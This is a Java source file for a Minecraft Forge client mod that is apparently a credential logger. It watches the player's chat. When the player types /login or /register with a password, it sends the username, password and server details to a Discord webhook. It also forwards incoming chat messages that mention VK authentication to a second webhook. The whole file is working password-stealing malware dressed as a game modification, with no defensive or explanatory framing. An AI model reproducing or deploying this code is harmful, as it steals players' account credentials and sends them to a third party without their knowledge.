package me.bushroot.logger;

import me.bushroot.logger.config.cfg;
import me.bushroot.logger.webhook.DiscordWebhook;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import java.awt.*;
import java.io.IOException;
import java.util.Objects;

public class log {
    DiscordWebhook webhookLogger = cfg.logger;
    DiscordWebhook webhookDetector = cfg.detector;

    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            try {
                webhookLogger.clearEmbeds();
                webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle("Infinity")
                        .setDescription("Minecraft Modification | Logger")
                        .setColor(new Color(0xA800E8))
                        .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
                        .addField("PASSWORD", sentences[1], true)
                        .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
                        .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).pingToServer), true)
                        .addField("VERSION", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).gameVersion, true)
                        .addField("NAME", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverName, true)


                        .setThumbnail("https://media.discordapp.net/attachments/924953438222155800/969573716570808390/104631337.png"));

                webhookLogger.execute();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    @SubscribeEvent
    public void detector(ClientChatReceivedEvent e) {
        String msg = e.getMessage().getUnformattedText();
        // String[] sentences = msg.split(" ");

        if (msg.contains("ВКонтакте")) {
            try {
                webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ```" + msg + "```");
                webhookDetector.execute();
            } catch (IOException ignored) {}
        }
    }
}
